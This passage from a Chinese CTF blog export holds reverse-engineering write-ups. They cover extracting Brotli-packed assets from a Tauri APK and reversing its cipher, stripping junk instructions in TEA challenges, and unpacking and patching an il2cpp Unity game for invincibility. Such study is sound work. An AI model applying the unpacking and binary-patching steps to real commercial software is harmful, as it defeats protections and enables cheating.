class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> brotli<br><br>compressed_file_path = <span class="hljs-string">r&quot;C:\Users\38489\Desktop\index_html.br&quot;</span><br>output_file_path = <span class="hljs-string">r&quot;C:\Users\38489\Desktop\dumpp&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(compressed_file_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Compressed file size: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(content)&#125;</span> bytes&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_decompress</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> brotli.decompress(data)<br>    <span class="hljs-keyword">except</span> brotli.error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>decompressed = <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(content), <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>    decompressed = try_decompress(content[:i])<br>    <span class="hljs-keyword">if</span> decompressed <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> decompressed <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file_path, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decompressed)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decompressed content written to <span class="hljs-subst">&#123;output_file_path&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to decompress the content.&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>然后就可以读取html文件内容啦</p><hr><h4 id="这题的解题wp："><a href="#这题的解题wp：" class="headerlink" title="这题的解题wp："></a>这题的解题wp：</h4><p>解包apk文件之后看看有啥内容</p><p>打开assets想要找到.js文件或者.html文件，但是只有prof文件，说明前端资源被打包或者压缩了，结合tauri框架，前端文件可能被打包进rust后端可执行文件里了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020931046.png" alt="image-20250717161547585"></p><p>ida反编译so文件</p><p>依照上面写的静态资源提取方法，解压缩index.html内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020931624.png" alt="image-20250718173951503"></p><p>index内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507181825791.png" alt="image-20250718182510695"></p><p>加载核心 JS，<code>index-BsFf5qny.js</code> 是打包后的 <strong>入口 JS</strong> 文件。负责启动 Vue 应用、挂载到 <code>#app</code>，以及通过 Tauri 的 API 调用 Rust 后端。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;module&quot;</span> crossorigin src=<span class="hljs-string">&quot;/assets/index-BsFf5qny.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>和上述过程一样，继续搜索关键词，找到这个js文件，dump出来后解压</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507181742060.png" alt="image-20250718174211972"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs idapython">import ida_bytes<br>import idc<br>import os<br><br>OUT_DIR = r&quot;C:\Users\38489\Desktop&quot;<br>RES_NAME = &quot;index-BsFf5qny.js.br&quot;  <br><br>data_ea = idc.get_name_ea_simple(&quot;unk_C356F&quot;)<br>if data_ea == idc.BADADDR:<br>    raise RuntimeError(&quot;找不到符号 unk_C356F，请确认名字一致。&quot;)<br><br>comp_size = 0x5D50<br><br>print(f&quot;[+] Dumping resource from 0x&#123;data_ea:X&#125;, size 0x&#123;comp_size:X&#125; (&#123;comp_size&#125; bytes)&quot;)<br><br>blob = ida_bytes.get_bytes(data_ea, comp_size)<br>if blob is None:<br>    raise RuntimeError(&quot;读取资源失败（可能地址或长度不对）。&quot;)<br><br>os.makedirs(OUT_DIR, exist_ok=True)<br>out_path = os.path.join(OUT_DIR, RES_NAME)<br>with open(out_path, &quot;wb&quot;) as f:<br>    f.write(blob)<br><br>print(f&quot;[+] 写出压缩文件: &#123;out_path&#125; (size=&#123;len(blob)&#125; bytes)&quot;)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> brotli<br><br>in_path = <span class="hljs-string">r&quot;C:\Users\38489\Desktop\index-BsFf5qny.js.br&quot;</span><br>out_path = <span class="hljs-string">r&quot;C:\Users\38489\Desktop\index-BsFf5qny.js&quot;</span><br><br>data = <span class="hljs-built_in">open</span>(in_path, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-keyword">try</span>:<br>    dec = brotli.decompress(data)<br>    <span class="hljs-built_in">open</span>(out_path, <span class="hljs-string">&quot;wb&quot;</span>).write(dec)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 成功解压 -&gt;&quot;</span>, out_path, <span class="hljs-string">&quot;长度&quot;</span>, <span class="hljs-built_in">len</span>(dec))<br><span class="hljs-keyword">except</span> brotli.error <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] 解压失败:&quot;</span>, e)<br><br></code></pre></td></tr></table></figure><p>解压出来之后，找到关键点：js与后端rust交互，后端接口是greet，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020931028.png" alt="image-20250718183114865"></p><p>直接在ida里搜索greet，找到函数，就是主加密函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020931733.png"></p><p>脚本</p><p>写脚本的时候还是要注意一下密文的提取，最后是v8的第19位与v19的第三位数据往后的八字节内容，当时脚本在密文这没好好分析，结果一直没出来，还是得注意一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>TABLE = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x64</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x6C</span>,<span class="hljs-number">0x7A</span>,<br>    <span class="hljs-number">0x59</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x6C</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x51</span>,<br>    <span class="hljs-number">0x57</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x72</span><br>])<br><br>target_values = [<br>    <span class="hljs-number">0x0A409663A025150C</span>,<br>    <span class="hljs-number">0x1FE106294065165C</span>,<br>    <span class="hljs-number">0xFC020A4C0E2C7290</span>,<br>    <span class="hljs-number">0x2A324F</span><br>]<br><br>full_data = <span class="hljs-string">b&#x27;&#x27;</span>.join(struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, v) <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> target_values)<br>TARGET = full_data[:<span class="hljs-number">27</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol8</span>(<span class="hljs-params">x, n</span>): <span class="hljs-keyword">return</span> ((x &lt;&lt; (n&amp;<span class="hljs-number">7</span>)) | (x &gt;&gt; (<span class="hljs-number">8</span>-(n&amp;<span class="hljs-number">7</span>)))) &amp; <span class="hljs-number">0xFF</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror8</span>(<span class="hljs-params">x, n</span>): <span class="hljs-keyword">return</span> ((x &gt;&gt; (n&amp;<span class="hljs-number">7</span>)) | (x &lt;&lt; (<span class="hljs-number">8</span>-(n&amp;<span class="hljs-number">7</span>)))) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward_byte</span>(<span class="hljs-params">i, b_in</span>):<br>    idx_mix = i <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">14</span> <span class="hljs-keyword">else</span> i - <span class="hljs-number">14</span><br>    tblA = TABLE[idx_mix]<br>    idx_dyn = (((<span class="hljs-number">2</span>*i) | <span class="hljs-number">1</span>) - <span class="hljs-number">14</span> * ((<span class="hljs-number">147</span> * ((<span class="hljs-number">2</span>*i) | <span class="hljs-number">1</span>)) &gt;&gt; <span class="hljs-number">11</span>)) &amp; <span class="hljs-number">0xFF</span><br>    tblB = TABLE[idx_dyn % <span class="hljs-built_in">len</span>(TABLE)]<br>    rot_src = TABLE[(i + <span class="hljs-number">3</span>) % <span class="hljs-number">14</span>]<br>    xsrc    = TABLE[(i + <span class="hljs-number">4</span>) % <span class="hljs-number">14</span>]<br>    rot     = rot_src &amp; <span class="hljs-number">7</span><br>    v11 = (tblB + (b_in ^ tblA)) &amp; <span class="hljs-number">0xFF</span><br>    <span class="hljs-keyword">return</span> xsrc ^ rol8(v11, rot)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_byte</span>(<span class="hljs-params">i, b_out</span>):<br>    idx_mix = i <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">14</span> <span class="hljs-keyword">else</span> i - <span class="hljs-number">14</span><br>    tblA = TABLE[idx_mix]<br>    idx_dyn = (((<span class="hljs-number">2</span>*i) | <span class="hljs-number">1</span>) - <span class="hljs-number">14</span> * ((<span class="hljs-number">147</span> * ((<span class="hljs-number">2</span>*i) | <span class="hljs-number">1</span>)) &gt;&gt; <span class="hljs-number">11</span>)) &amp; <span class="hljs-number">0xFF</span><br>    tblB = TABLE[idx_dyn % <span class="hljs-built_in">len</span>(TABLE)]<br>    rot_src = TABLE[(i + <span class="hljs-number">3</span>) % <span class="hljs-number">14</span>]<br>    xsrc    = TABLE[(i + <span class="hljs-number">4</span>) % <span class="hljs-number">14</span>]<br>    rot     = rot_src &amp; <span class="hljs-number">7</span><br>    r   = b_out ^ xsrc<br>    v11 = ror8(r, rot)<br>    tmp = (v11 - tblB) &amp; <span class="hljs-number">0xFF</span><br>    <span class="hljs-keyword">return</span> tmp ^ tblA<br><br>recovered = <span class="hljs-built_in">bytes</span>(reverse_byte(i, TARGET[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(TARGET)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Recovered 27-byte input:&quot;</span>, recovered)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hex:&quot;</span>, recovered.<span class="hljs-built_in">hex</span>())<br><br>recheck = <span class="hljs-built_in">bytes</span>(forward_byte(i, recovered[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(TARGET)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Forward recompute matches TARGET?:&quot;</span>, recheck == TARGET)<br><br></code></pre></td></tr></table></figure><p>完结撒花~</p><p>另附，学习这位师傅的tauri框架静态资源提取的方法<a href="https://blog.yllhwa.com/2023/05/09/Tauri%20%E6%A1%86%E6%9E%B6%E7%9A%84%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">https://blog.yllhwa.com/2023/05/09/Tauri%20%E6%A1%86%E6%9E%B6%E7%9A%84%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/</a></p>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花指令-近跳转和call0h型</title>
    <link href="/2025/06/02/%E8%8A%B1%E6%8C%87%E4%BB%A4-%E8%BF%91%E8%B7%B3%E8%BD%AC%E5%92%8Ccall0h%E5%9E%8B/"/>
    <url>/2025/06/02/%E8%8A%B1%E6%8C%87%E4%BB%A4-%E8%BF%91%E8%B7%B3%E8%BD%AC%E5%92%8Ccall0h%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>根据<a href="https://xz.aliyun.com/news/14062">https://xz.aliyun.com/news/14062</a> 这位师傅的文章学习来的</p><p>这两道题目的花指令都是近跳转和call 0h型</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022341874.png" alt="image-20250602234135782"></p><h3 id="1、LitCTF-2025-easy-tea"><a href="#1、LitCTF-2025-easy-tea" class="headerlink" title="1、LitCTF 2025 | easy_tea"></a>1、LitCTF 2025 | easy_tea</h3><p>直接shift+f2找到主要的加密位置，然后看到花，把这个近跳转nop，然后下面的函数按d转为机器码，有好几处花，都直接nop掉</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337395.png" alt="img"></p><p>然后一整个部分再按p识别成函数，然后f5，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337449.png" alt="img"></p><p>这里主tea加密部分仍然看不到，进去之后看到这一部分还是花，nop掉之后，把下面的部分按d，最后直接按p和f5反汇编和上面的操作一样</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337445.png" alt="img"></p><p>就是这个</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337401.png" alt="img"></p><h3 id="2、camellia-练习"><a href="#2、camellia-练习" class="headerlink" title="2、camellia-练习"></a>2、camellia-练习</h3><p>这个题也一样，把近跳转nop掉之后，再把下面的那段按d看机器码更方便</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337040.png" alt="img"></p><p>这里就是要nop掉的，call 0h类型</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337415.png" alt="img"></p><p>如果看不出来也可以把这一小段按c强制编译看汇编，这里就是花指令，nop掉</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022336973.png" alt="img"></p><p>然后再把剩下的那一段按c强制编译，没啥问题，已经除掉花了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022336957.png" alt="img"></p><p>然后f5看伪代码，发现这里的加密函数位置还有无法编译的花指令</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022337991.png" alt="img"></p><p>进入那个函数，还是一样的思路，nop掉之后反编译就能看到代码了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022358942.png" alt="img"></p><p>这就是主要的tea加密算法，解密就行</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202506022336945.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>reverse-探索的过程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>花指令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unity逆向il2cpp打包</title>
    <link href="/2025/05/29/unity%E9%80%86%E5%90%91il2cpp%E6%89%93%E5%8C%85/"/>
    <url>/2025/05/29/unity%E9%80%86%E5%90%91il2cpp%E6%89%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="unity逆向-il2cpp"><a href="#unity逆向-il2cpp" class="headerlink" title="unity逆向-il2cpp"></a>unity逆向-il2cpp</h1><h3 id="LitCTF-2025-Robbie-Wanna-Revenge"><a href="#LitCTF-2025-Robbie-Wanna-Revenge" class="headerlink" title="LitCTF 2025-Robbie Wanna Revenge"></a>LitCTF 2025-Robbie Wanna Revenge</h3><p>il2cpp打包的unity游戏题，在网上搜了文章，</p><p>根据晓梦的文章<a href="https://xz.aliyun.com/news/15811">https://xz.aliyun.com/news/15811</a></p><p>和swdd的文章<a href="https://blog.csdn.net/qq_24481913/article/details/148234091?sharetype=blogdetail&sharerId=148234091&sharerefer=PC&sharesource=qq_24481913&spm=1011.2480.3001.8118">https://blog.csdn.net/qq_24481913/article/details/148234091?sharetype=blogdetail&amp;sharerId=148234091&amp;sharerefer=PC&amp;sharesource=qq_24481913&amp;spm=1011.2480.3001.8118</a></p><p>利用ilcppdumper提取il2cpp等文件，这是il2cppdumper下载的网址<a href="https://github.com/Perfare/Il2CppDumper/">https://github.com/Perfare/Il2CppDumper/</a></p><p>在终端输入命令 <code>.\Il2CppDumper.exe 文件名.dll 文件名.dat output</code>，dll文件就是GameAssembly.dll</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291128040.png" alt="image-20250528233715951"></p><p>直接运行命令发现报错，识别不到，再看dll文件，加了壳</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291144110.png" alt="image-20250528213639891"></p><p>还修改了特征码，用010改回来之后再脱壳</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291147990.png" alt="image-20250528223136275"></p><p>脱壳之后再运行命令。就成功dump了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291147004.png" alt="image-20250528223115942"></p><p>这就是dump出来的文件</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291522063.png" alt="image-20250528234206707"></p><p>用dnspy查看Assembly-CSharp.dll（来自dump后的文件中）的内容，找到playerhealth函数的内容，这里面主要是通过playerdied来判断角色是否死亡，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291523692.png" alt="image-20250528225350874"></p><p>用ida打开脱壳后的GameAssembly.dll文件，再附加文件，左上角file&#x2F;script file，附加ida_with_struct_py3.py和script.json文件，然后再加上il2cpp.h文件</p><p>等到加载完成之后，找到对应的playerhealth函数的位置，看汇编，找到对应位置，把下面的jnz改为jmp（强跳转）</p><p>ps：这里强跳转就是 把jnz对应的机器码0F 85改为jmp的机器码90 E9</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291523443.png" alt="image-20250528225834456"></p><p>修改成功之后就是这样，然后patch保存之后再重新运行游戏就是无敌状态了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/picture-bed@image/image/202505291147003.png" alt="image-20250528231357969"></p>]]></content>
    
    
    <categories>
      
      <category>reverse-探索的过程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unity逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[document  .querySelector('#web_bg')  .setAttribute('style', `background-image: ${document.querySelector('.banner').style.background.split(' ')[0]};position: fixed;width: 100%;height: 100%;z-index: -1;background-size: cover;`);document  .querySelector("#banner")  .setAttribute('style', 'background-image: url()')document  .querySelector("#banner .mask")  .setAttribute('style', 'background-color:rgba(0,0,0,0)')]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>categories</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
